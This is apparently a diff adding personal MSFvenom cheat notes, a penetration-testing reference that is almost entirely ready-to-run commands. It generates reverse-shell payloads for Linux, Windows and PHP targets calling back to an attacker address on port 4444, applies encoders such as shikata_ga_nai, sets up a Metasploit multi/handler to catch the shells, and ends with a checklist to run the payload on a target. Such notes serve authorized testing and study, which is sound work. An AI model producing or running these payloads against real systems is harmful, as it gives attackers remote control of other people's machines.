@@ -1,0 +1,175 @@
+   
+
+MSFvenom
+
+# 🐍 MSFvenom Cheat Notes
+
+## 📌 What is MSFvenom?
+
+- Replaces old `msfpayload` + `msfencode`.
+    
+- Used to **generate payloads** for exploitation.
+    
+- Supports many **formats** (exe, elf, php, asp, war, etc.) & **targets** (Windows, Linux, Android, iOS).
+    
+
+---
+
+## 🔍 Discover payloads
+
+List all available payloads:
+
+msfvenom -l payloads
+
+```
+msfvenom -l payloads
+```
+
+---
+
+## 🖨️ Output formats
+
+List supported output formats:
+
+msfvenom --list formats
+
+```
+msfvenom --list formats
+```
+
+Examples:
+
+- `-f exe` → Windows executable
+    
+- `-f elf` → Linux binary
+    
+- `-f raw` → raw shellcode
+    
+- `-f python` → embed in script
+    
+- `-f php` → PHP webshell
+    
+
+---
+
+## 🔐 Encoders
+
+Used to **encode payloads** (e.g., avoid bad chars), not guaranteed to bypass AV.  
+List encoders:
+
+msfvenom -l encoders
+
+```
+msfvenom -l encoders
+```
+
+Use encoder:
+
+-e x86/shikata_ga_nai -i 5
+
+```
+-e x86/shikata_ga_nai -i 5
+```
+
+(encode 5 times)
+
+---
+
+## 🚀 Examples
+
+### Linux reverse shell ELF
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
+chmod +x shell.elf
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
+chmod +x shell.elf
+```
+
+### Windows reverse Meterpreter EXE
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
+```
+
+### PHP reverse shell
+
+msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
+# Edit: add <?php at start and ?> at end
+
+```
+msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
+# Edit: add <?php at start and ?> at end
+```
+
+### Python shellcode
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python
+
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python
+```
+
+### Encode example (Base64 for PHP)
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -e php/base64
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -e php/base64
+```
+
+---
+
+## 🎣 Setting up the handler
+
+Use multi/handler to catch the shell.
+
+msfconsole
+use exploit/multi/handler
+set payload php/reverse_php
+set LHOST 10.10.10.10
+set LPORT 4444
+run
+
+```
+msfconsole
+use exploit/multi/handler
+set payload php/reverse_php
+set LHOST 10.10.10.10
+set LPORT 4444
+run
+```
+
+✅ Works for all payloads (Windows, Linux, etc.), just change `payload`.
+
+---
+
+## 📝 Quick checklist for MSFvenom
+
+✅ Choose payload for target system (check with `msfvenom -l payloads`).  
+✅ Set `LHOST` = your IP, `LPORT` = your listening port.  
+✅ Decide on output format (`-f`).  
+✅ (Optional) encode with `-e encoder -i n`.  
+✅ Save payload to file.  
+✅ Set up `exploit/multi/handler` in Metasploit.  
+✅ Run payload on target, wait for reverse connection.
+
+---
+
+## 💡 Tips
+
+- Always check your IP (`ip a`) and firewall rules.
+    
+- If not connecting, verify:
+    
+    - Target can reach your LHOST IP + port is open.
+        
+    - Correct payload architecture (x86 vs x64).
+        
+- Use `netcat` to test connectivity before trying payload.
+    
+
+---
